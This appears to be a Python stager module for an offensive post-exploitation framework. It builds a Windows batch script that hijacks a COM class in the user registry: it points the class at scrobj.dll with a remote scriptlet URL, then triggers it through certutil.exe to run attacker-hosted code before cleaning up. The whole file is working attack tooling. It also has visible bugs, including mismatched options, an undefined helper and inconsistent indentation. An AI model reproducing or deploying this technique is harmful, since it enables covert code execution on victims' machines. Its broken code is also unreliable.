
class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Bashrc file',

            'Author': '@homjxie @subTee',

            'Description': ('execute Stager in sct via COM-Hijacking|  echo @="">>COMHijack.reg'),

            'Comments': [
                'https://twitter.com/homjxi0e'
		        'https://twitter.com/subTee'
            ]
        }


        self.options = {


            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'python'
            },
            'OutFile' : {
                'Description'   :   'File to output Bash script to, otherwise displayed on the screen.',
                'Required'      :   True,
                'Value'         :   '/tmp/COM.bat'
            },
            'URL' : {
                'Description'   :   '',
                'Required'      :   True,
                'Value'         :   'echo @="URL the SCT your">>COMHijack.reg'
            },
            'SafeChecks' : {
                'Description'   :   'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required'      :   True,
                'Value'         :   'True'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }



        self.mainMenu = mainMenu

        for param in params:

            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):


        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        safeChecks = self.options['SafeChecks']['Value']
	OutFile = self.options['SafeChecks']['Value']


        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, userAgent=userAgent, safeChecks=safeChecks)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""

	if OutFile == "":
            print Path.color("[!] Error In Path Man !!! .")
            return ""
        else:
            code = "echo Windows Registry Editor Version 5.00>>COMHijack.reg\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00]>>COMHijack.reg\n"
            code += "echo @=\"AtomicRedTeam\">>COMHijack.reg\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00\CLSID]>>COMHijack.reg\n"
            code += "echo @=\"{00000001-0000-0000-0000-0000FEEDACDC}\">>COMHijack.reg \n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]>>COMHijack.reg \n"
            code += "echo @=\"AtomicRedTeam\">>COMHijack.reg\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam\CLSID]>>COMHijack.reg \n"
            code += "echo @=\"{00000001-0000-0000-0000-0000FEEDACDC}\">>COMHijack.reg \n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}]>>COMHijack.reg \n"
            code += "echo @=\"AtomicRedTeam\">>COMHijack.reg\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32]>>COMHijack.reg\n"
            code += "echo @=\"C:\\WINDOWS\\system32\\scrobj.dll\">>COMHijack.reg\n"
            code += "echo \"ThreadingModel\"=\"Apartment\">>COMHijack.reg\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID]>>COMHijack.reg\n"
            code += "echo @=\"AtomicRedTeam.1.00\">>COMHijack.reg\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL]>>COMHijack.reg \n"
            code +=  "'\"" + self.options['URL']['Value'] + "\"'\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID]>>COMHijack.reg\n"
            code += "echo @=\"AtomicRedTeam\">>COMHijack.reg\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}]>>COMHijack.reg\n"
            code += "echo [HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}\TreatAs]>>COMHijack.reg\n"
            code += "echo @=\"{00000001-0000-0000-0000-0000FEEDACDC}\">>COMHijack.reg\n\n\n"
            code += "echo Windows Registry Editor Version 5.00>>COMHijackCleanup.reg\n"
            code += "echo [-HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.1.00]>>COMHijackCleanup.reg\n"
            code += "echo [-HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]>>COMHijackCleanup.reg\n"
            code += "echo [-HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{372FCE38-4324-11D0-8810-00A0C903B83C}]>>COMHijackCleanup.reg\n"
            code += "cls\n"
            code += "cmd /c reg import COMHijack.reg\n"
            code += "cmd /ccertutil.exe -CAInfo\n"
            code += "cls\n"
            code += "cmd /c reg import COMHijackCleanup.reg\n"

            return code
